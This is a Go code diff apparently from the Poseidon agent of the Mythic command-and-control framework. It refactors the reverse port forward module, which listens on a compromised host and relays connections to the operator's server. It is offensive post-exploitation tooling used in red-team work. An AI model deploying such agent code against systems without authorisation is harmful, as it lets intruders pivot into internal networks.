@@ -10,7 +10,6 @@ import (
 	"math"
 	"math/rand"
 	"net"
-	"sync"
 	"time"
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
@@ -20,16 +19,12 @@ type rpfwdTracker struct {
 	Channel    chan structs.SocksMsg
 	Connection net.Conn
 }
-type mutexMap struct {
-	sync.RWMutex
-	m map[uint32]rpfwdTracker
-}
 type Args struct {
 	Action string `json:"action"`
 	Port   int    `json:"port"`
 }
 
-var channelMap = mutexMap{m: make(map[uint32]rpfwdTracker)}
+var channelMap = make(map[uint32]rpfwdTracker)
 
 type addToMap struct {
 	ChannelID  uint32
@@ -39,6 +34,7 @@ type addToMap struct {
 
 var addToMapChan = make(chan addToMap)
 var removeFromMapChan = make(chan uint32, 100)
+var closeAllChannelsChan = make(chan bool)
 
 // var sendToMapChan = make(chan structs.SocksMsg)
 var startedGoRoutines = false
@@ -49,7 +45,6 @@ func Run(task structs.Task) {
 	args := Args{}
 	err := json.Unmarshal([]byte(task.Params), &args)
 	if !startedGoRoutines {
-		//go readFromMythic(profiles.FromMythicSocksChannel, profiles.InterceptToMythicSocksChannel)
 		go handleMutexMapModifications()
 		startedGoRoutines = true
 	}
@@ -59,9 +54,9 @@ func Run(task structs.Task) {
 		task.Job.SendResponses <- msg
 		return
 	}
+	closeAllChannelsChan <- true
 	msg := task.NewResponse()
 	if args.Action == "start" {
-		closeAllChannels()
 		if listener != nil {
 			if err = (*listener).Close(); err != nil {
 				msg = task.NewResponse()
@@ -71,7 +66,7 @@ func Run(task structs.Task) {
 			}
 		}
 		addr := fmt.Sprintf("0.0.0.0:%d", args.Port)
-		if l, err := net.Listen("tcp", addr); err != nil {
+		if l, err := net.Listen("tcp4", addr); err != nil {
 			msg = task.NewResponse()
 			msg.SetError(err.Error())
 			task.Job.SendResponses <- msg
@@ -83,51 +78,46 @@ func Run(task structs.Task) {
 		msg.UserOutput = fmt.Sprintf("reverse port forward started on port: %d\n", args.Port)
 		msg.Completed = true
 	} else {
-		closeAllChannels()
 		msg.UserOutput = fmt.Sprintf("reverse port forward stoped on port: %d\n", args.Port)
 		msg.Completed = true
 	}
 	task.Job.SendResponses <- msg
 
 }
-func closeAllChannels() {
-	ids := make([]uint32, len(channelMap.m))
-	if listener != nil {
-		(*listener).Close()
-		listener = nil
-	}
-	channelMap.RLock()
-	i := 0
-	for k := range channelMap.m {
-		ids[i] = k
-		i++
-	}
-	channelMap.RUnlock()
-	for _, id := range ids {
-		removeFromMapChan <- id
-	}
-
-}
 func handleMutexMapModifications() {
 	for {
 		select {
+		case <-closeAllChannelsChan:
+			keys := make([]uint32, len(channelMap))
+			i := 0
+			// close all the connections
+			for key, _ := range channelMap {
+				close(channelMap[key].Channel)
+				channelMap[key].Connection.Close()
+				keys[i] = key
+				i++
+			}
+			// delete all the keys
+			for _, key := range keys {
+				delete(channelMap, key)
+			}
 		case msg := <-addToMapChan:
-			channelMap.m[msg.ChannelID] = rpfwdTracker{
+			channelMap[msg.ChannelID] = rpfwdTracker{
 				Channel:    msg.NewChannel,
 				Connection: msg.Connection,
 			}
 		case msg := <-removeFromMapChan:
-			if _, ok := channelMap.m[msg]; ok {
-				close(channelMap.m[msg].Channel)
-				channelMap.m[msg].Connection.Close()
-				delete(channelMap.m, msg)
+			if _, ok := channelMap[msg]; ok {
+				close(channelMap[msg].Channel)
+				channelMap[msg].Connection.Close()
+				delete(channelMap, msg)
 				//fmt.Printf("Removed channel (%d) from map, now length %d\n", msg, len(channelMap.m))
 			}
 		case msg := <-responses.FromMythicRpfwdChannel:
 			//fmt.Printf("got message FromMythicRpfwdChannel: %d\n", msg.ServerId)
-			if _, ok := channelMap.m[msg.ServerId]; ok {
+			if _, ok := channelMap[msg.ServerId]; ok {
 				select {
-				case channelMap.m[msg.ServerId].Channel <- msg:
+				case channelMap[msg.ServerId].Channel <- msg:
 				case <-time.After(1 * time.Second):
 					//fmt.Printf("dropping data because channel is full")
 				}
@@ -183,10 +173,7 @@ func readFromProxy(conn net.Conn, toMythicRpfwdChannel chan structs.SocksMsg, ch
 			msg.Exit = true
 			toMythicRpfwdChannel <- msg
 			//fmt.Printf("Telling mythic locally to exit channel %d from bad proxy read, exit going back to mythic too\n", channelId)
-			//fromMythicSocksChannel <- msg
-			//conn.Close()
 			//fmt.Printf("closing from bad proxy read: %v, %v\n", err.Error(), channelId)
-			//go removeMutexMap(channelId)
 			removeFromMapChan <- channelId
 			return
 		}
@@ -210,9 +197,6 @@ func writeToProxy(recvChan chan structs.SocksMsg, conn net.Conn, channelId uint3
 			//fmt.Printf("channel (%d) got exit message from Mythic\n", channelId)
 			w.Flush()
 			//fmt.Printf("Telling mythic locally to exit channel %d, exit going back to mythic too\n", channelId)
-			//fromMythicSocksChannel <- bufOut
-			//conn.Close()
-			//go removeMutexMap(channelId)
 			removeFromMapChan <- channelId
 			return
 		}
@@ -224,10 +208,8 @@ func writeToProxy(recvChan chan structs.SocksMsg, conn net.Conn, channelId uint3
 			msg.ServerId = channelId
 			msg.Data = ""
 			msg.Exit = true
+			toMythicRpfwdChannel <- msg
 			//fmt.Printf("Telling mythic locally to exit channel %d, bad base64 data, exit going back to mythic too\n", channelId)
-			//fromMythicSocksChannel <- msg
-			//conn.Close()
-			//go removeMutexMap(channelId)
 			removeFromMapChan <- channelId
 			return
 		}
@@ -240,11 +222,8 @@ func writeToProxy(recvChan chan structs.SocksMsg, conn net.Conn, channelId uint3
 			msg.Exit = true
 			toMythicRpfwdChannel <- msg
 			//fmt.Printf("Telling mythic locally to exit channel %d bad write to proxy, exit going back to mythic too\n", channelId)
-			//fromMythicSocksChannel <- msg
 			//fmt.Printf("told mythic to exit channel %d through fromMythicSocksChannel <- msg\n", channelId)
-			//conn.Close()
 			//fmt.Printf("channel (%d) closing from bad proxy write\n", channelId)
-			//go removeMutexMap(channelId)
 			removeFromMapChan <- channelId
 			return
 		}
@@ -257,10 +236,8 @@ func writeToProxy(recvChan chan structs.SocksMsg, conn net.Conn, channelId uint3
 	msg.ServerId = channelId
 	msg.Data = ""
 	msg.Exit = true
+	toMythicRpfwdChannel <- msg
 	//fmt.Printf("Telling mythic locally to exit channel %d proxy writing go routine exiting, exit going back to mythic too\n", channelId)
-	//fromMythicSocksChannel <- msg
-	//conn.Close()
-	//go removeMutexMap(channelId)
 	removeFromMapChan <- channelId
 	return
 }
